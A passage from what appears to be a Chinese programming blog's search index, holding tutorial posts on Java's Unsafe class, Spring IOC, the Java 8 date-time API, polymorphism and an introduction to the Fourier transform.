baseAddress=“0x110000”，通过baseAddress+valueOffset得到value的内存地址valueAddress=“0x11000c”；然后通过CAS进行原子性的更新操作，成功则返回，否则继续重试，直到更新成功为止。 3、线程调度 包括线程挂起、恢复、锁机制等方法。 12345678910111213复制&#x2F;&#x2F;取消阻塞线程 public native void unpark(Object thread); &#x2F;&#x2F;阻塞线程 public native void park(boolean isAbsolute, long time); &#x2F;&#x2F;获得对象锁（可重入锁） @Deprecated public native void monitorEnter(Object o); &#x2F;&#x2F;释放对象锁 @Deprecated public native void monitorExit(Object o); &#x2F;&#x2F;尝试获取对象锁 @Deprecated public native boolean tryMonitorEnter(Object o); 方法park、unpark即可实现线程的挂起与恢复，将一个线程进行挂起是通过park方法实现的，调用park方法后，线程将一直阻塞直到超时或者中断等条件出现；unpark可以终止一个挂起的线程，使其恢复正常。 典型应用 Java锁和同步器框架的核心类AbstractQueuedSynchronizer，就是通过调用LockSupport.park()和LockSupport.unpark()实现线程的阻塞和唤醒的，而LockSupport的park、unpark方法实际是调用Unsafe的park、unpark方式来实现。 4、内存屏障 在Java 8中引入，用于定义内存屏障（也称内存栅栏，内存栅障，屏障指令等，是一类同步屏障指令，是CPU或编译器在对内存随机访问的操作中的一个同步点，使得此点之前的所有读写操作都执行后才可以开始执行此点之后的操作），避免代码重排序。 123456复制&#x2F;&#x2F;内存屏障，禁止load操作重排序。屏障前的load操作不能被重排序到屏 障后，屏障后的load操作不能被重排序到屏障前 public native void loadFence(); &#x2F;&#x2F;内存屏障，禁止store操作重排序。屏障前的store操作不能被重排序到屏障后， 屏障后的store操作不能被重排序到屏障前 public native void storeFence(); &#x2F;&#x2F;内存屏障，禁止load、store操作重排序 public native void fullFence(); 典型应用 在Java 8中引入了一种锁的新机制——StampedLock，它可以看成是读写锁的一个改进版本。StampedLock提供了一种乐观读锁的实现，这种乐观读锁类似于无锁的操作，完全不会阻塞写线程获取写锁，从而缓解读多写少时写线程“饥饿”现象。由于StampedLock提供的乐观读锁不阻塞写线程获取读锁，当线程共享变量从主内存load到线程工作内存时，会存在数据不一致问题，所以当使用StampedLock的乐观读锁时，需要遵从如下图用例中使用的模式来确保数据的一致性。 如上图用例所示计算坐标点Point对象，包含点移动方法move及计算此点到原点的距离的方法distanceFromOrigin。在方法distanceFromOrigin中，首先，通过tryOptimisticRead方法获取乐观读标记；然后从主内存中加载点的坐标值(x,y)；而后通过StampedLock的validate方法校验锁状态，判断坐标点(x,y)从主内存加载到线程工作内存过程中，主内存的值是否已被其他线程通过move方法修改，如果validate返回值为true，证明(x,y)的值未被修改，可参与后续计算；否则，需加悲观读锁，再次从主内存加载(x,y)的最新值，然后再进行距离计算。其中，校验锁状态这步操作至关重要，需要判断锁状态是否发生改变，从而判断之前copy到线程工作内存中的值是否与主内存的值存在不一致。 下图为StampedLock.validate方法的源码实现，通过锁标记与相关常量进行位运算、比较来校验锁状态，在校验逻辑之前，会通过Unsafe的loadFence方法加入一个load内存屏障，目的是避免上图用例中步骤②和StampedLock.validate中锁状态校验运算发生重排序导致锁状态校验不准确的问题。","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"}]},{"title":"Spring IOC 的世界","slug":"springIOC","date":"2019-09-18T16:00:00.000Z","updated":"2020-10-25T08:27:43.000Z","comments":true,"path":"springIOC/","link":"","permalink":"https://gschaos.club/springIOC/","excerpt":"Spring IOC","text":"Spring IOC bean 的转换过程下面这张图演示了一个可用的 bean 是如何从 xml 配置文件中演变过来的。 ApplicationContext 的架构图 loadBean 的全流程 getBean 的全流程","categories":[{"name":"Spring","slug":"Spring","permalink":"https://gschaos.club/categories/Spring/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"},{"name":"Spring","slug":"Spring","permalink":"https://gschaos.club/tags/Spring/"}]},{"title":"Java 8 日期时间 API","slug":"Java 8 日期时间 API","date":"2019-09-14T16:00:00.000Z","updated":"2020-10-25T08:24:00.000Z","comments":true,"path":"Java 8 日期时间 API/","link":"","permalink":"https://gschaos.club/Java%208%20%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4%20API/","excerpt":"java 8 通过发布新的Date-Time API (JSR 310)来进一步加强对日期和时间的处理。","text":"java 8 通过发布新的Date-Time API (JSR 310)来进一步加强对日期和时间的处理。 Java 8 日期时间 API在旧版本的Java中，日期时间API存在诸多问题，其中有: 非线程安全 - java.util.Date 是非线程安全的，所有的日期类都是可变的，这是Java日期类最大的问题之一。 设计很差 - Java的日期/时间类的定义并不一致，在java.util和java.sql的包中都有日期类，此外用于格式化和解析的类在java.text包中定义。java.Date同时包含日期和时间，而java.Date仅包含日期，将其纳入java.sql包并不合理，另外这两个类都有相同的名字，本身就是一个非常糟糕的设计。 时区处理麻烦 - 日期类并不提供国际化，没有时区支持，因此Java引入了java.util.Calenda和java.util.TimeZone类，单他们同样存在上述的所有问题。 Java 8 在java.time包下提供了很多新的API。以下为两个比较重要的API： Local(本地) - 简化了日期时间的处理，没有时区的问题。 Zoned(时区) - 通过制定的时区处理日期时间。 新的java.time包涵盖了所有处理日期，时间，日期/时间，时区，时刻(instants),过程(during),与时钟(clock)的操作。 1.本地化日期时间 APILocalDate/LocalTime和LocalDateTime类可以在处理时区不是必须的情况。代码如下 1234567891011121314151617181920212223242526272829303132333435public class Java8Tester&#123; public static void main(String args[])&#123; Java8Tester java8Tester = new Java8Tester(); java8Tester.testLocalDateTime(); &#125; public void testLocalDateTime()&#123; //获取当前日期时间 LocalDateTime currentTime = LocalDateTime.now(); System.out.println(&quot;当前时间:&quot;+currentTime); LocalDate date1 = currentTime.toLocalDate(); System.out.println(&quot;date1: &quot;+date1); Month month = currentTime.getMonth(); int day = currentTime.getDayOfMonth(); int senconds = currentTime.getSecond(); System.out.println(&quot;月：&quot;+ month + &quot;，日：&quot; + day + &quot;,秒：&quot; + senconds); //指定年日 2019/09/10 LocalDateTime date2 = currentTime.withDayOfMonth(10).withYear(2019); System.out.println(&quot;date2: &quot;+ date2); //指定年月日 2019-11-10 LocalDate date3 = LocalDate.of(2019,Month.NOVEMBER,10); System.out.println(&quot;date3: &quot;+ date3); //22时15分钟 LocalTime date4 = LocalTime.of(22,10); System.out.println(&quot;date4: &quot;+ date4); //解析字符串 LocalTime date5 = LocalTime.parse(&quot;20:15:30&quot;); System.out.println(date5); &#125;&#125; 执行以上脚本，输出结果为： 12345678910111213当前时间: 2018-06-08T15:19:16.910date1:2018-06-08月: JUNE, 日: 8, 秒: 16date2:2012-06-10T15:19:16.910date3:2014-12-12date4:22:15date5:20:15:30 2 使用时区的日期时间API如果我们需要考虑到时区，就可以使用时区的日期时间API： 12345678910111213141516public class Java8Tester &#123; public static void main(String args[]) &#123; Java8Tester java8Tester = new Java8Tester(); java8Tester.testZonedDateTime(); &#125; public void testZonedDateTime() &#123; // 获取当前时间日期 ZonedDateTime date1 = ZonedDateTime.parse(&quot;2019-12-03T10:15:30+05:30[Asia/Shanghai]&quot;); System.out.println(&quot;date1: &quot; + date1); ZoneId id = ZoneId.of(&quot;Europe/Paris&quot;); System.out.println(&quot;ZoneId: &quot; + id); ZoneId currentZone = ZoneId.systemDefault(); System.out.println(&quot;当期时区: &quot; + currentZone); &#125;&#125; 执行以上脚本，输出结果为： 12345date1:2015-12-03T10:15:30+08:00[Asia/Shanghai]ZoneId:Europe/Paris当期时区: Asia/Shanghai 3.常用代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586LocalDate today = LocalDate.now(); System.out.println(&quot;今天的日期是：&quot;+today); System.out.println(&quot;-----------------------------&quot;); int year = today.getYear(); int month = today.getMonthValue(); int day = today.getDayOfMonth(); System.out.println(&quot;年：&quot;+year+&quot;,月：&quot;+month+&quot;,日：&quot;+day); System.out.println(&quot;-----------------------------&quot;); LocalDate birthday = LocalDate.of(2011, 11, 11); System.out.println(&quot;特定日期：&quot;+birthday); System.out.println(&quot;-----------------------------&quot;); System.out.println(&quot;今天的日期是2011-11-11吗？&quot;+today.equals(birthday)); System.out.println(&quot;-----------------------------&quot;); LocalDate dayofbirth = LocalDate.of(2008, 11, 20); LocalDate tday = LocalDate.now(); // 获取生日的月、日 MonthDay birthMonthDay = MonthDay.of(dayofbirth.getMonth(), dayofbirth.getDayOfMonth()); MonthDay currentMonthDay = MonthDay.from(tday); if (currentMonthDay.equals(birthMonthDay)) &#123; System.out.println(&quot;今天是你的生日&quot;); &#125;else&#123; System.out.println(&quot;对不起，今天不是你的生日&quot;); &#125; System.out.println(&quot;-----------------------------&quot;); LocalTime localTime = LocalTime.now(); System.out.println(&quot;现在的时间是&quot;+localTime); System.out.println(&quot;-----------------------------&quot;); LocalTime twoHourLaterTime = localTime.plusHours(2); System.out.println(&quot;当前时间两小时后的时间是&quot;+twoHourLaterTime); System.out.println(&quot;-----------------------------&quot;); LocalDate oneWeekLaterDate = today.plus(1,ChronoUnit.WEEKS); System.out.println(&quot;两周后的日期是：&quot;+oneWeekLaterDate); System.out.println(&quot;-----------------------------&quot;); LocalDate oneYearBeforeDate = today.minus(1, ChronoUnit.YEARS); System.out.println(&quot;一年前的日期是：&quot;+oneYearBeforeDate); LocalDate oneYearLaterDate = today.plus(1, ChronoUnit.YEARS); System.out.println(&quot;一年后的日期是：&quot;+oneYearLaterDate); System.out.println(&quot;-----------------------------&quot;); Clock clock = Clock.systemUTC(); System.out.println(&quot;Clock:&quot;+clock); Clock.systemDefaultZone(); System.out.println(&quot;Clock:&quot;+clock.millis()); System.out.println(&quot;-----------------------------&quot;); LocalDate day1 = LocalDate.of(2011, 12, 15); LocalDate day2 = LocalDate.of(2011, 9, 17); System.out.println(&quot;day1是否在day2之后：&quot;+day1.isAfter(day2)); System.out.println(&quot;day1是否在day2之前：&quot;+day1.isBefore(day2)); System.out.println(&quot;-----------------------------&quot;); LocalDateTime todaytime = LocalDateTime.now(); System.out.println(&quot;当前的日期时间：&quot;+todaytime); ZoneId zone = ZoneId.of(ZoneId.SHORT_IDS.get(&quot;ACT&quot;)); ZonedDateTime dateandtimeinNewYork = ZonedDateTime.of(todaytime, zone); System.out.println(&quot;现在时区的时间在特定时区的时间：&quot;+dateandtimeinNewYork); System.out.println(&quot;-----------------------------&quot;); YearMonth currentYearMonth = YearMonth.now(); System.out.println(&quot;今年的当前月&quot;+currentYearMonth+&quot;有&quot;+currentYearMonth.lengthOfMonth()+&quot;天&quot;); YearMonth creditCardExpiry = YearMonth.of(2018, Month.FEBRUARY); System.out.println(&quot;您输入的年月日期是：&quot;+creditCardExpiry); System.out.println(&quot;-----------------------------&quot;); System.out.println(&quot;今年&quot;+today+&quot;是否是闰年：&quot;+today.isLeapYear()); System.out.println(&quot;-----------------------------&quot;); LocalDate day3 = LocalDate.of(2002, 12, 10); LocalDate day4 = LocalDate.of(2001, 9, 12); Period period = Period.between(day3, day4); System.out.println(day3+&quot;和&quot;+day4+&quot;之间相差&quot;+period.getMonths()+&quot;月&quot;); System.out.println(&quot;-----------------------------&quot;); LocalDateTime datetime = LocalDateTime.of(2016, Month.APRIL, 14, 14, 02, 24); ZoneOffset offset = ZoneOffset.of(&quot;+05:30&quot;); OffsetDateTime offsetdatetime = OffsetDateTime.of(datetime, offset); System.out.println(&quot;日期和时间在时区上的偏移时间：&quot;+offsetdatetime); System.out.println(&quot;-----------------------------&quot;); Instant timestamp = Instant.now(); System.out.println(&quot;当前时间戳：&quot;+timestamp); System.out.println(&quot;-----------------------------&quot;); String dayaftertommrow = &quot;20160205&quot;; LocalDate formatdate = LocalDate.parse(dayaftertommrow,DateTimeFormatter.BASIC_ISO_DATE); System.out.println(dayaftertommrow+&quot;格式化后的日期是&quot;+formatdate); System.out.println(&quot;-----------------------------&quot;); String goodFriday = &quot;04 14 2016&quot;; DateTimeFormatter dateTimeFormatter = DateTimeFormatter.ofPattern(&quot;MM dd yyyy&quot;); LocalDate holiday = LocalDate.parse(goodFriday,dateTimeFormatter); System.out.println(goodFriday+&quot;自定义格式化后的日期是&quot;+holiday); System.out.println(&quot;-----------------------------&quot;); DateTimeFormatter formatter = DateTimeFormatter.ofPattern(&quot;MM dd yyyy HH:mm a&quot;); String datestr = todaytime.format(formatter); System.out.println(&quot;自定义格式化后的当前日期时间是&quot;+datestr); 4.注意点 Instant 它代表的是时间戳，比如2016-04-14T14:20:13.592Z，这可以从java.time.Clock类中获取，像这样： Instant current = Clock.system(ZoneId.of(“Asia/Tokyo”)).instant(); LocalDate 它表示的是不带时间的日期，比如2016-04-14。它可以用来存储生日，周年纪念日，入职日期等。 LocalTime - 它表示的是不带日期的时间 LocalDateTime - 它包含了时间与日期，不过没有带时区的偏移量 ZonedDateTime - 这是一个带时区的完整时间，它根据UTC/格林威治时间来进行时区调整 这个库的主包是java.time，里面包含了代表日期，时间，瞬时以及持续时间的类。它有两个子package，一个是java.time.foramt，这个是什么用途就很明显了，还有一个是java.time.temporal，它能从更低层面对各个字段进行访问。 时区指的是地球上共享同一标准时间的地区。每个时区都有一个唯一标识符，同时还有一个地区/城市(Asia/Tokyo)的格式以及从格林威治时间开始的一个偏移时间。比如说，东京的偏移时间就是+09:00。 OffsetDateTime类实际上包含了LocalDateTime与ZoneOffset。它用来表示一个包含格林威治时间偏移量（+/-小时：分，比如+06:00或者 -08：00）的完整的日期（年月日）及时间（时分秒，纳秒）。 DateTimeFormatter类用于在Java中进行日期的格式化与解析。与SimpleDateFormat不同，它是不可变且线程安全的，如果需要的话，可以赋值给一个静态变量。DateTimeFormatter类提供了许多预定义的格式器，你也可以自定义自己想要的格式。当然了，根据约定，它还有一个parse()方法是用于将字符串转换成日期的，如果转换期间出现任何错误，它会抛出DateTimeParseException异常。类似的，DateFormatter类也有一个用于格式化日期的format()方法，它出错的话则会抛出DateTimeException异常。 再说一句，“MMM d yyyy”与“MMm dd yyyy”这两个日期格式也略有不同，前者能识别出”Jan 2 2014”与”Jan 14 2014”这两个串，而后者如果传进来的是”Jan 2 2014”则会报错，因为它期望月份处传进来的是两个字符。为了解决这个问题，在天为个位数的情况下，你得在前面补0，比如”Jan 2 2014”应该改为”Jan 02 2014”。","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"}]},{"title":"多态","slug":"多态","date":"2019-09-03T16:00:00.000Z","updated":"2020-10-25T08:29:17.000Z","comments":true,"path":"多态/","link":"","permalink":"https://gschaos.club/%E5%A4%9A%E6%80%81/","excerpt":"","text":"多态所谓多态就是指程序中定义的引用变量所指向的具体类型和通过该引用变量发出的方法调用在编程时并不确定，而是在程序运行期间才确定，即一个引用变量倒底会指向哪个类的实例对象，该引用变量发出的方法调用到底是哪个类中实现的方法，必须在由程序运行期间才能决定。因为在程序运行时才确定具体的类，这样，不用修改源程序代码，就可以让引用变量绑定到各种不同的类实现上，从而导致该引用调用的具体方法随之改变，即不修改程序代码就可以改变程序运行时所绑定的具体代码，让程序可以选择多个运行状态，这就是多态性。 比如你是一个酒神，对酒情有独钟。某日回家发现桌上有几个杯子里面都装了白酒，从外面看我们是不可能知道这是些什么酒，只有喝了之后才能够猜出来是何种酒。你一喝，这是剑南春、再喝这是五粮液、再喝这是酒鬼酒….在这里我们可以描述成如下： 123酒 a = 剑南春酒 b = 五粮液酒 c = 酒鬼酒 这里所表现的的就是多态。剑南春、五粮液、酒鬼酒都是酒的子类，我们只是通过酒这一个父类就能够引用不同的子类，这就是多态——我们只有在运行的时候才会知道引用变量所指向的具体实例对象。 诚然，要理解多态我们就必须要明白什么是“向上转型”。在继承中我们简单介绍了向上转型，这里就在啰嗦下：在上面的喝酒例子中，酒（Win）是父类，剑南春（JNC）、五粮液（WLY）、酒鬼酒（JGJ）是子类。我们定义如下代码： 1JNC a = new JNC(); 对于这个代码我们非常容易理解无非就是实例化了一个剑南春的对象嘛！但是这样呢？ 1Wine a = new JNC(); 在这里我们这样理解，这里定义了一个Wine 类型的a，它指向JNC对象实例。由于JNC是继承与Wine，所以JNC可以自动向上转型为Wine，所以a是可以指向JNC实例对象的。这样做存在一个非常大的好处，在继承中我们知道子类是父类的扩展，它可以提供比父类更加强大的功能，如果我们定义了一个指向子类的父类引用类型，那么它除了能够引用父类的共性外，还可以使用子类强大的功能。 但是向上转型存在一些缺憾，那就是它必定会导致一些方法和属性的丢失，而导致我们不能够获取它们。所以父类类型的引用可以调用父类中定义的所有属性和方法，对于只存在与子类中的方法和属性它就望尘莫及了。 123456789101112131415161718192021222324252627282930313233343536373839404142public class Wine &#123; public void fun1()&#123; System.out.println(&quot;Wine 的Fun.....&quot;); fun2(); &#125; public void fun2()&#123; System.out.println(&quot;Wine 的Fun2...&quot;); &#125;&#125;public class JNC extends Wine&#123; /** * @desc 子类重载父类方法 * 父类中不存在该方法，向上转型后，父类是不能引用该方法的 * @param a * @return void */ public void fun1(String a)&#123; System.out.println(&quot;JNC 的 Fun1...&quot;); fun2(); &#125; /** * 子类重写父类方法 * 指向子类的父类引用调用fun2时，必定是调用该方法 */ public void fun2()&#123; System.out.println(&quot;JNC 的Fun2...&quot;); &#125;&#125;public class Test &#123; public static void main(String[] args) &#123; Wine a = new JNC(); a.fun1(); &#125;&#125;-------------------------------------------------Output:Wine 的Fun.....JNC 的Fun2... 从程序的运行结果中我们发现，a.fun1()首先是运行父类Wine中的fun1().然后再运行子类JNC中的fun2()。 分析：在这个程序中子类JNC重载了父类Wine的方法fun1()，重写fun2()，而且重载后的fun1(String a)与 fun1()不是同一个方法，由于父类中没有该方法，向上转型后会丢失该方法，所以执行JNC的Wine类型引用是不能引用fun1(String a)方法。而子类JNC重写了fun2() ，那么指向JNC的Wine引用会调用JNC中fun2()方法。 所以对于多态我们可以总结如下： 指向子类的父类引用由于向上转型了，它只能访问父类中拥有的方法和属性，而对于子类中存在而父类中不存在的方法，该引用是不能使用的，尽管是重载该方法。若子类重写了父类中的某些方法，在调用该些方法的时候，必定是使用子类中定义的这些方法（动态连接、动态调用）。 对于面向对象而已，多态分为编译时多态和运行时多态。其中编译时多态是静态的，主要是指方法的重载，它是根据参数列表的不同来区分不同的函数，通过编译之后会变成两个不同的函数，在运行时谈不上多态。而运行时多态是动态的，它是通过动态绑定来实现的，也就是我们所说的多态性。 多态的实现2.1实现条件 在刚刚开始就提到了继承在为多态的实现做了准备。子类Child继承父类Father，我们可以编写一个指向子类的父类类型引用，该引用既可以处理父类Father对象，也可以处理子类Child对象，当相同的消息发送给子类或者父类对象时，该对象就会根据自己所属的引用而执行不同的行为，这就是多态。即多态性就是相同的消息使得不同的类做出不同的响应。 Java实现多态有三个必要条件：继承、重写、向上转型。 继承：在多态中必须存在有继承关系的子类和父类。 重写：子类对父类中某些方法进行重新定义，在调用这些方法时就会调用子类的方法。 向上转型：在多态中需要将子类的引用赋给父类对象，只有这样该引用才能够具备技能调用父类的方法和子类的方法。 只有满足了上述三个条件，我们才能够在同一个继承结构中使用统一的逻辑实现代码处理不同的对象，从而达到执行不同的行为。 对于Java而言，它多态的实现机制遵循一个原则：当超类对象引用变量引用子类对象时，被引用对象的类型而不是引用变量的类型决定了调用谁的成员方法，但是这个被调用的方法必须是在超类中定义过的，也就是说被子类覆盖的方法。 2.2实现形式 在Java中有两种形式可以实现多态。继承和接口。 2.2.1、基于继承实现的多态 基于继承的实现机制主要表现在父类和继承该父类的一个或多个子类对某些方法的重写，多个子类对同一方法的重写可以表现出不同的行为。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889public class Wine &#123; private String name; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public Wine()&#123; &#125; public String drink()&#123; return &quot;喝的是 &quot; + getName(); &#125; /** * 重写toString() */ public String toString()&#123; return null; &#125;&#125;public class JNC extends Wine&#123; public JNC()&#123; setName(&quot;JNC&quot;); &#125; /** * 重写父类方法，实现多态 */ public String drink()&#123; return &quot;喝的是 &quot; + getName(); &#125; /** * 重写toString() */ public String toString()&#123; return &quot;Wine : &quot; + getName(); &#125;&#125;public class JGJ extends Wine&#123; public JGJ()&#123; setName(&quot;JGJ&quot;); &#125; /** * 重写父类方法，实现多态 */ public String drink()&#123; return &quot;喝的是 &quot; + getName(); &#125; /** * 重写toString() */ public String toString()&#123; return &quot;Wine : &quot; + getName(); &#125;&#125;public class Test &#123; public static void main(String[] args) &#123; //定义父类数组 Wine[] wines = new Wine[2]; //定义两个子类 JNC jnc = new JNC(); JGJ jgj = new JGJ(); //父类引用子类对象 wines[0] = jnc; wines[1] = jgj; for(int i = 0 ; i &lt; 2 ; i++)&#123; System.out.println(wines[i].toString() + &quot;--&quot; + wines[i].drink()); &#125; System.out.println(&quot;-------------------------------&quot;); &#125;&#125;OUTPUT:Wine : JNC--喝的是 JNCWine : JGJ--喝的是 JGJ------------------------------- 在上面的代码中JNC、JGJ继承Wine，并且重写了drink()、toString()方法，程序运行结果是调用子类中方法，输出JNC、JGJ的名称，这就是多态的表现。不同的对象可以执行相同的行为，但是他们都需要通过自己的实现方式来执行，这就要得益于向上转型了。所以基于继承实现的多态可以总结如下：对于引用子类的父类类型，在处理该引用时，它适用于继承该父类的所有子类，子类对象的不同，对方法的实现也就不同，执行相同动作产生的行为也就不同。 如果父类是抽象类，那么子类必须要实现父类中所有的抽象方法，这样该父类所有的子类一定存在统一的对外接口，但其内部的具体实现可以各异。这样我们就可以使用顶层类提供的统一接口来处理该层次的方法。 2.2.2、基于接口实现的多态 继承是通过重写父类的同一方法的几个不同子类来体现的，那么就可就是通过实现接口并覆盖接口中同一方法的几不同的类体现的。 在接口的多态中，指向接口的引用必须是指定这实现了该接口的一个类的实例程序，在运行时，根据对象引用的实际类型来执行对应的方法。 继承都是单继承，只能为一组相关的类提供一致的服务接口。但是接口可以是多继承多实现，它能够利用一组相关或者不相关的接口进行组合与扩充，能够对外提供一致的服务接口。所以它相对于继承来说有更好的灵活性。 一个难度颇高的多态的例子123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public class A &#123; public String show(D obj) &#123; return (&quot;A and D&quot;); &#125; public String show(A obj) &#123; return (&quot;A and A&quot;); &#125;&#125;public class B extends A&#123; public String show(B obj)&#123; return (&quot;B and B&quot;); &#125; public String show(A obj)&#123; return (&quot;B and A&quot;); &#125;&#125;public class C extends B&#123;&#125;public class D extends B&#123;&#125;public class Test &#123; public static void main(String[] args) &#123; A a1 = new A(); A a2 = new B(); B b = new B(); C c = new C(); D d = new D(); System.out.println(&quot;1--&quot; + a1.show(b)); System.out.println(&quot;2--&quot; + a1.show(c)); System.out.println(&quot;3--&quot; + a1.show(d)); System.out.println(&quot;4--&quot; + a2.show(b)); System.out.println(&quot;5--&quot; + a2.show(c)); System.out.println(&quot;6--&quot; + a2.show(d)); System.out.println(&quot;7--&quot; + b.show(b)); System.out.println(&quot;8--&quot; + b.show(c)); System.out.println(&quot;9--&quot; + b.show(d)); &#125;&#125; 1234567891--A and A2--A and A3--A and D4--B and A5--B and A6--A and D7--B and B8--B and B9--A and D 在这里看结果1、2、3还好理解，从4开始就开始糊涂了，对于4来说为什么输出不是“B and B”呢？ 首先我们先看一句话：当超类对象引用变量引用子类对象时，被引用对象的类型而不是引用变量的类型决定了调用谁的成员方法，但是这个被调用的方法必须是在超类中定义过的，也就是说被子类覆盖的方法。这句话对多态进行了一个概括。其实在继承链中对象方法的调用存在一个优先级：this.show(O)、super.show(O)、this.show((super)O)、super.show((super)O)。 分析： 从上面的程序中我们可以看出A、B、C、D存在如下关系。 首先我们分析5，a2.show(c)，a2是A类型的引用变量，所以this就代表了A，a2.show(c),它在A类中找发现没有找到，于是到A的超类中找(super)，由于A没有超类（Object除外），所以跳到第三级，也就是this.show((super)O)，C的超类有B、A，所以(super)O为B、A，this同样是A，这里在A中找到了show(A obj)，同时由于a2是B类的一个引用且B类重写了show(A obj)，因此最终会调用子类B类的show(A obj)方法，结果也就是B and A。 按照同样的方法我也可以确认其他的答案。 方法已经找到了但是我们这里还是存在一点疑问，我们还是来看这句话：当超类对象引用变量引用子类对象时，被引用对象的类型而不是引用变量的类型决定了调用谁的成员方法，但是这个被调用的方法必须是在超类中定义过的，也就是说被子类覆盖的方法。这我们用一个例子来说明这句话所代表的含义：a2.show(b)； 这里a2是引用变量，为A类型，它引用的是B对象，因此按照上面那句话的意思是说有B来决定调用谁的方法,所以a2.show(b)应该要调用B中的show(B obj)，产生的结果应该是“B and B”，但是为什么会与前面的运行结果产生差异呢？这里我们忽略了后面那句话“但是这儿被调用的方法必须是在超类中定义过的”，那么show(B obj)在A类中存在吗？根本就不存在！所以这句话在这里不适用？那么难道是这句话错误了？非也！其实这句话还隐含这这句话：它仍然要按照继承链中调用方法的优先级来确认。所以它才会在A类中找到show(A obj)，同时由于B重写了该方法所以才会调用B类中的方法，否则就会调用A类中的方法。 所以多态机制遵循的原则概括为：当超类对象引用变量引用子类对象时，被引用对象的类型而不是引用变量的类型决定了调用谁的成员方法，但是这个被调用的方法必须是在超类中定义过的，也就是说被子类覆盖的方法，但是它仍然要根据继承链中方法调用的优先级来确认方法，该优先级为：this.show(O)、super.show(O)、this.show((super)O)、super.show((super)O)。 项目中的实例 项目中需要同时对4个数据源进行数据扫描，并进行处理，这里使用的是与当前线程绑定的方式获取的数据源。 主类： 12345678910111213141516171819@Componentpublic class BCKTask implements ApplicationRunner &#123; ... @Autowired Dispatcher dispatcher; @Override public void run(ApplicationArguments args) throws Exception &#123; lifrontequcfg.forEach(a -&gt; &#123; //判断本机器是否拥有执行权 List&lt;String&gt; ipList = IPUtil.dealIP(a.getLibackendcmdequ_cfg().getIp()); if (ipList.contains(ip)) &#123; log.debug(&quot;本机拥有执行权，ip:[&#123;&#125;]&quot;, ip); dispatcher.distribute(a); &#125; &#125;); &#125;&#125; 获取执行权限后将在dispatcher中分发数据源。 1234567891011121314151617181920212223242526272829303132333435363738394041public class Dispatcher &#123; @Autowired private Source source; public boolean distribute(LiEquRoleCfg.LiFrontEquCfg a) &#123; .... switch (equId) &#123; case &quot;xx&quot;: new Thread(() -&gt; &#123; ChangeDataInter cmData = CmData.getInstance(...); cmData.work(); &#125;).start(); break; case &quot;xx&quot;: new Thread(() -&gt; &#123; ChangeDataInter cuData = new CuData(...); cuData.work(); &#125;).start(); break; case &quot;xx&quot;: new Thread(() -&gt; &#123; ChangeDataInter ctData = new CtData(...); ctData.work(); &#125;).start(); break; case &quot;xx&quot;: new Thread(() -&gt; &#123; ChangeDataInter ccpnData = new CcpnData(...); ccpnData.work(); &#125;).start(); break; default: break; &#125; return true; &#125;&#125; 这里启动了4个线程去分别扫描对应的表，其实他们的扫库以及接下来的逻辑都是相同的，所以这里使用了多态将通用的方法提出指BaseDataSourceHandler，子类只需要实例化的时候绑定一下数据源即可(数据源有切点切入)； 其中一个子类CmData(请忽略单例的创建线程安全性。)： 12345678910111213141516171819202122public class CmData extends BaseDataSourceHandler &#123; private static Logger log = LoggerFactory.getLogger(CmData.class); private SubTaskMapper subTaskMapper; public static CmData getInstance()&#123; return new CmData(socketParam); &#125; private CmData(SocketParam socketParam) &#123; super(socketParam); this.socketParam = socketParam; &#125; static &#123; DynamicDataSourceContextHolder.setDataSourceRouterKey(&quot;cm&quot;); &#125; BaseDataSourceHandler: 1234567891011121314public class BaseDataSourceHandler implements ChangeDataInter &#123;@Override public void work() &#123; subTaskMapper = socketParam.getSubTaskMapper(); ExecutorService executorService = Ti3ExecutorServiceUtil.getExecutorServiceInstance(); while (Thread.currentThread().isAlive()) &#123; //查询可执行任务并进行处理 canRunTask(); //执行socket并处理结果 if (!Objects.isNull(socketParam.getSetTargetReq())) &#123; executorService.submit(new SocketThread(socketParam)); &#125; &#125; &#125; ChangeDataInter: 123public interface ChangeDataInter &#123; void work();&#125;","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"},{"name":"多态","slug":"多态","permalink":"https://gschaos.club/tags/%E5%A4%9A%E6%80%81/"}]},{"title":"傅里叶变换","slug":"what's this","date":"2019-09-02T16:00:00.000Z","updated":"2020-09-11T03:14:09.000Z","comments":true,"path":"what's this/","link":"","permalink":"https://gschaos.club/what's%20this/","excerpt":"","text":"作者：DBinary 作为一个资深信号狗,必须强答一波这个问题,想当年也是被一堆变换公式折磨的要死要活的,多年过去了,用的多了发现也就是那么回事,尽管其内部的数学推论是复杂的(其实也就那样),但真的要说,仍然可以用最简单的几句话和最通俗易懂的语言把它的原理和作用讲清楚. 既然要讲,我就从最基础的东西开始说一说,首先我们先来认识下三角函数,要说三角函数这个东西,我们首先要来说说弧度,什么是弧度呢,你可以在纸上画一个圆,选取圆的一段边,边长和这个圆半径的比值,就是该边与圆心对应夹角的弧度,不好理解是不是,没关系,看个图你就懂了 弧度的单位是rad,你会发现,所有的圆边长和半径的比值都是2πRad,而π是一个无限不循环的常数,它约等于3.1415926,可以发现弧度和角度是一个对应的关系,如果按角度制而言绕圆一周是360°,弧度制而言,就是2π了 现在,我们引入另一个在信号处理中极为极为极为重要的一个函数,三角函数,之所以叫做三角函数,是因为它的计算方式和直角三角密切相关 三角函数又常常叫正弦函数常用的主要有sin和cos两种,在高中的书本上,常常叫它们正弦函数和余弦函数,但实际在使用中,不管是sin还是cos都常常被统称为正弦函数,看上面的直角三角形, 以sin函数为例,关于这个函数的求法,可以用下面的公式来表述 也就是说sin角a的值,等于其对应直角三角形的对边比斜边,实际上我们常常用 来表示这个正弦函数,而 则表示某一弧度,如果你把这个三角形画在一个二维坐标系的圆上面,比如下面的这种形式 那么 